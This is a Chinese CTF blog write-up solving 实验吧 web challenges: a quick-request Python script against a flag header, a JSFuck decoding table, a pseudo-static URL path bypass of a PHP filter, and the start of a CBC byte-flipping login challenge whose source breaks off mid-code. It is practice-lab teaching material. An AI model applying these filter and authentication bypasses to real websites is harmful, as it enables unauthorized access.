<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>实验吧ctf题小计 | Welcome to Jas0nwhy&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="实验吧ctf题小计天下武功唯快不破这道题给出提示There is no martial art is indefectible, while the fastest speed is the only way for long success.You must do it as fast as you can!审查元素发现注释 please post what you find with para">
<meta name="keywords" content="技术,ctf">
<meta property="og:type" content="article">
<meta property="og:title" content="实验吧ctf题小计">
<meta property="og:url" content="http://yoursite.com/child/2018/06/01/实验吧小计/index.html">
<meta property="og:site_name" content="Welcome to Jas0nwhy&#39;s Blog">
<meta property="og:description" content="实验吧ctf题小计天下武功唯快不破这道题给出提示There is no martial art is indefectible, while the fastest speed is the only way for long success.You must do it as fast as you can!审查元素发现注释 please post what you find with para">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://wx2.sinaimg.cn/mw690/0060lm7Tly1frumcoseeqj310z09s40n.jpg">
<meta property="og:image" content="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fry0lfei0ij30yo09rq4n.jpg">
<meta property="og:image" content="http://image.3001.net/images/20180228/15198072135832.png!small">
<meta property="og:image" content="https://img-blog.csdn.net/20180324215047728">
<meta property="og:image" content="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fry43htcz8j30eu05ct9c.jpg">
<meta property="og:image" content="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fry45loq5uj30k502idfv.jpg">
<meta property="og:image" content="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fry4a9zjkjj30zc0bxwfk.jpg">
<meta property="og:image" content="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fry4fmdsgwj30zv0bljt5.jpg">
<meta property="og:image" content="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fry4gn71u3j3121096jsx.jpg">
<meta property="og:image" content="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fry4s56ahaj30w108jt9v.jpg">
<meta property="og:image" content="http://t.cn/R1HUSzY">
<meta property="og:image" content="http://t.cn/R1HUWvF">
<meta property="og:image" content="http://t.cn/R1HUe2a">
<meta property="og:image" content="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fryaa78kycj30b4022741.jpg">
<meta property="og:image" content="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fryab0jtbaj30b601x0nc.jpg">
<meta property="og:image" content="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryabuhti5j30a602c741.jpg">
<meta property="og:image" content="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryafzy505j30f5023dfl.jpg">
<meta property="og:image" content="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryahgdnsjj30aw02i741.jpg">
<meta property="og:image" content="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryabuhti5j30a602c741.jpg">
<meta property="og:image" content="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fryamkr5hwj30kp062aab.jpg">
<meta property="og:image" content="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fryark9iifj30zu07jmy9.jpg">
<meta property="og:updated_time" content="2018-06-03T13:45:16.995Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="实验吧ctf题小计">
<meta name="twitter:description" content="实验吧ctf题小计天下武功唯快不破这道题给出提示There is no martial art is indefectible, while the fastest speed is the only way for long success.You must do it as fast as you can!审查元素发现注释 please post what you find with para">
<meta name="twitter:image" content="http://wx2.sinaimg.cn/mw690/0060lm7Tly1frumcoseeqj310z09s40n.jpg">
  
    <link rel="alternative" href="/atom.xml" title="Welcome to Jas0nwhy&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/http://ww4.sinaimg.cn/large/a15b4afegy1fmpyh1revgj20hs0hsdgg">
  
  
      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
        <a href="/" class="profilepic">
            
            <img lazy-src="http://ww4.sinaimg.cn/large/a15b4afegy1fmpyh1revgj20hs0hsdgg" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">jas0nwhy</a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
			<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=280 height=86 src="//music.163.com/outchain/player?type=2&id=532166475&auto=1&height=66"></iframe>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a  href="https://jas0nwhy.github.io/">博客首页</a></li>
                        
                            <li><a  href="/archives">文章归档</a></li>
                        
                            <li><a  href="/CTFStudy">学习导航</a></li>
                        
                            <li><a  href="/PWNABLE">PWNABLE</a></li>
                        
                            <li><a  href="/resume">个人简历</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail"  target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=rZyZmJuZmJ2UmJzt3NyDzsLA" title="mail">mail</a>
                            
                                <a class="fl github"  target="_blank" href="https://github.com/Jas0nwhy/jas0nwhy.github.io" title="github">github</a>
                            
                                <a class="fl zhihu"  target="_blank" href="https://www.zhihu.com/people/jasontu-sen-po/activities" title="zhihu">zhihu</a>
                            
                                <a class="fl weibo"  target="_blank" href="https://weibo.com/6446326734/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
                            
                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/C语言/" style="font-size: 10px;">C语言</a> <a href="/tags/Google-hacking/" style="font-size: 10px;">Google hacking</a> <a href="/tags/MSF/" style="font-size: 10px;">MSF</a> <a href="/tags/SQL注入/" style="font-size: 10px;">SQL注入</a> <a href="/tags/ctf/" style="font-size: 16.67px;">ctf</a> <a href="/tags/python/" style="font-size: 13.33px;">python</a> <a href="/tags/web/" style="font-size: 13.33px;">web</a> <a href="/tags/代码审计/" style="font-size: 10px;">代码审计</a> <a href="/tags/关于我/" style="font-size: 10px;">关于我</a> <a href="/tags/变量覆盖/" style="font-size: 10px;">变量覆盖</a> <a href="/tags/复习记录/" style="font-size: 10px;">复习记录</a> <a href="/tags/学习历程/" style="font-size: 10px;">学习历程</a> <a href="/tags/技术/" style="font-size: 20px;">技术</a> <a href="/tags/文件解析/" style="font-size: 10px;">文件解析</a> <a href="/tags/正则表达式/" style="font-size: 10px;">正则表达式</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a>
                    </div>
                </section>
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://ring3.xyz/">Yllen</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://mxny.org/">麦香浓郁</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/">K0sh1</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.ycjcl.cc/">信鑫</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://bystudent.com/">ByStundet表哥</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.jarviswang.me/">汪神_Jarvis</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://sh3ll.me/">Chu</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.hackfun.org/">4ido10n</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy">L3m0n</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://o0xmuhe.me/">muhe</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.nuptzj.cn/">_画船听雨</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.virzz.com/index.html">Virink</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.sqlsec.com/">国光</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.bodkin.ren/">老锥</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.cizel.cn/">C1zel</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://1phan.cc">1phan</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.liuil.top/">liuil</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/">Ox9A82</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://burnegg.com/">burnegg</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://jwrsec.cn/">jwr-sec</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://sudalover.cn/">苏打</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.binklac.com">VeroFess</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.bendawang.site/">bendawang</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://weeklyalgo.codes/">hook</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.flier.net.cn/">Flier&#39;blog</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.mutepig.club">mutepig</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://blog.iret.xyz/list.aspx">Silver</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://simp1e.leanote.com/">Simple</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://processor.pub/">Processor</a>
                    
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">一只什么都不会的咸鱼</div>
                </section>
                
		     </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">jas0nwhy</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/http://ww4.sinaimg.cn/large/a15b4afegy1fmpyh1revgj20hs0hsdgg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me">jas0nwhy</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="https://jas0nwhy.github.io/">博客首页</a></li>
                
                    <li><a href="/archives">文章归档</a></li>
                
                    <li><a href="/CTFStudy">学习导航</a></li>
                
                    <li><a href="/PWNABLE">PWNABLE</a></li>
                
                    <li><a href="/resume">个人简历</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=rZyZmJuZmJ2UmJzt3NyDzsLA" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://github.com/Jas0nwhy/jas0nwhy.github.io" title="github">github</a>
                    
                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/jasontu-sen-po/activities" title="zhihu">zhihu</a>
                    
                        <a class="weibo" target="_blank" href="https://weibo.com/6446326734/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-实验吧小计" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/06/01/实验吧小计/" class="article-date">
      <time datetime="2018-06-01T03:35:12.000Z" itemprop="datePublished">2018-06-01</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      实验吧ctf题小计
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="实验吧ctf题小计"><a href="#实验吧ctf题小计" class="headerlink" title="实验吧ctf题小计"></a>实验吧ctf题小计</h3><h4 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h4><p>这道题给出提示<br>There is no martial art is indefectible, while the fastest speed is the only way for long success.<br>You must do it as fast as you can!<br>审查元素发现注释<br> please post what you find with parameter:key<br> 也就是我们需要post传参一个key值得到flag<br> bp抓包看一下<br> <img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1frumcoseeqj310z09s40n.jpg" alt="image"><br> 响应头中有FLAGbase64编码，但是发现每一次请求都会改变base64值，所以我们需要写一个小脚本来快速抓取FLAG解码再post传参<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> # -*- coding: utf-8 -*</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">r= requests.get(&quot;http://ctf5.shiyanbar.com/web/10/10.php&quot;)</span><br><span class="line">r=r.headers.get(&apos;FLAG&apos;)</span><br><span class="line">r=base64.b64decode(r)</span><br><span class="line">print r[25:34]</span><br><span class="line">d = &#123;&apos;key&apos;:r[25:34]&#125;</span><br><span class="line">r = requests.post(&quot;http://ctf5.shiyanbar.com/web/10/10.php&quot;, data=d)</span><br><span class="line">print r.text</span><br></pre></td></tr></table></figure></p>
<p> 得到flag： CTF{Y0U_4R3_1NCR3D1BL3_F4ST!}</p>
<h4 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h4><p>打开得到一坨[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!。。。。<br>这是JSFuck编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">false       =&gt;  ![]</span><br><span class="line">true        =&gt;  !![]</span><br><span class="line">undefined   =&gt;  [][[]]</span><br><span class="line">NaN         =&gt;  +[![]]</span><br><span class="line">0           =&gt;  +[]</span><br><span class="line">1           =&gt;  +!+[]</span><br><span class="line">2           =&gt;  !+[]+!+[]</span><br><span class="line">10          =&gt;  [+!+[]]+[+[]]</span><br><span class="line">Array       =&gt;  []</span><br><span class="line">Number      =&gt;  +[]</span><br><span class="line">String      =&gt;  []+[]</span><br><span class="line">Boolean     =&gt;  ![]</span><br><span class="line">Function    =&gt;  [][&quot;filter&quot;]</span><br><span class="line">eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line">window      =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br></pre></td></tr></table></figure></p>
<p><a href="http://www.bugku.com/tools/jsfuck/" target="_blank" rel="noopener">在线网站</a>解码得到flag：Ihatejs  </p>
<h4 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">// code by SEC@USTC</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;charset&quot; content=&quot;gbk&quot;&gt;&lt;/head&gt;&lt;body&gt;&apos;;</span><br><span class="line"></span><br><span class="line">$URL = $_SERVER[&apos;REQUEST_URI&apos;];</span><br><span class="line">//echo &apos;URL: &apos;.$URL.&apos;&lt;br/&gt;&apos;;</span><br><span class="line">$flag = &quot;CTF&#123;???&#125;&quot;;</span><br><span class="line"></span><br><span class="line">$code = str_replace($flag, &apos;CTF&#123;???&#125;&apos;, file_get_contents(&apos;./index.php&apos;));\\从index.php中读入一个字符串，再讲文件字符串中的flag变量值改变为CTF&#123;???&#125;</span><br><span class="line">$stop = 0;</span><br><span class="line"></span><br><span class="line">//这道题目本身也有教学的目的</span><br><span class="line">//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的</span><br><span class="line">//所以，第一个要求就是不得出现 ./</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;./&apos;) !== FALSE)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 1;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第二，我们可以构造 \ 来代替被过滤的 /</span><br><span class="line">//所以，第二个要求就是不得出现 ../</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;\\&apos;) !== FALSE)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 2;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第三，有的系统大小写通用，例如 indirectioN/</span><br><span class="line">//你也可以用?和#等等的字符绕过，这需要统一解决</span><br><span class="line">//所以，第三个要求对可以用的字符做了限制，a-z / 和 .</span><br><span class="line">$matches = array();</span><br><span class="line">preg_match(&apos;/^([0-9a-z\/.]+)$/&apos;, $URL, $matches);</span><br><span class="line">if($flag &amp;&amp; empty($matches) || $matches[1] != $URL)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 3;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第四，多个 / 也是可以的</span><br><span class="line">//所以，第四个要求是不得出现 //</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;//&apos;) !== FALSE)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 4;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第五，显然加上index.php或者减去index.php都是可以的</span><br><span class="line">//所以我们下一个要求就是必须包含/index.php，并且以此结尾</span><br><span class="line">if($flag &amp;&amp; substr($URL, -10) !== &apos;/index.php&apos;)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 5;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第六，我们知道在index.php后面加.也是可以的</span><br><span class="line">//所以我们禁止p后面出现.这个符号</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;p.&apos;) !== FALSE)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 6;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第七，现在是最关键的时刻</span><br><span class="line">//你的$URL必须与/indirection/index.php有所不同</span><br><span class="line">if($flag &amp;&amp; $URL == &apos;/indirection/index.php&apos;)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 7;        //Pass</span><br><span class="line">&#125;</span><br><span class="line">if(!$stop) $stop = 8;</span><br><span class="line"></span><br><span class="line">echo &apos;Flag: &apos;.$flag;</span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;;</span><br><span class="line">for($i = 1; $i &lt; $stop; $i++)</span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Pass&apos;, $code);</span><br><span class="line">for(; $i &lt; 8; $i++)</span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Not Pass&apos;, $code);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo highlight_string($code, TRUE);</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;/body&gt;&lt;/html&gt;&apos;;</span><br></pre></td></tr></table></figure>
<p>代码中要求要去访问index.php，但是不能直接使用/indirection/index.php访问，同时过滤了./<br>、../、大小写绕过、//、文件后的. 、以及必须以/index.php结尾<br>在网上搜索了一下才知道可以利用伪静态技术，构造url：<a href="http://ctf5.shiyanbar.com/indirection/index.php/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/indirection/index.php/index.php</a><br>相当于服务器将第二个index.php当做参数处理了，服务器就只解析到第一个index.php<br>flag： CTF{PSEDUO_STATIC_DO_YOU_KNOW}   </p>
<h4 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h4><p>开始随便输入，然后bp抓包，发现tips：test.php<br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fry0lfei0ij30yo09rq4n.jpg" alt="image"><br>访问<a href="http://ctf5.shiyanbar.com/web/jiandan/test.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/jiandan/test.php</a><br>得到源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">define(&quot;SECRET_KEY&quot;, &apos;***********&apos;);</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);\\想到cbc字节翻转攻击</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&apos;conn.php&apos;);</span><br><span class="line">function sqliCheck($str)&#123;\\该函数对传入的变量进行过滤，防止SQL注入</span><br><span class="line">	if(preg_match(&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str))&#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line">function get_random_iv()&#123;\\该函数随机生产一个16位iv值</span><br><span class="line">    $random_iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line">function login($info)&#123;</span><br><span class="line">	$iv = get_random_iv();</span><br><span class="line">	$plain = serialize($info);\\对传入的数组序列化</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);// 采用aes-128-cbc 方式加密序列化后的plain,返回原始或者base64编码后的字符串</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));//cookie 值为base64编码的iv</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));// cookie 值为bas64编码的值cipher</span><br><span class="line">&#125;</span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">	global $link;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);// 解码cookie和iv，并解密得到plain</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, 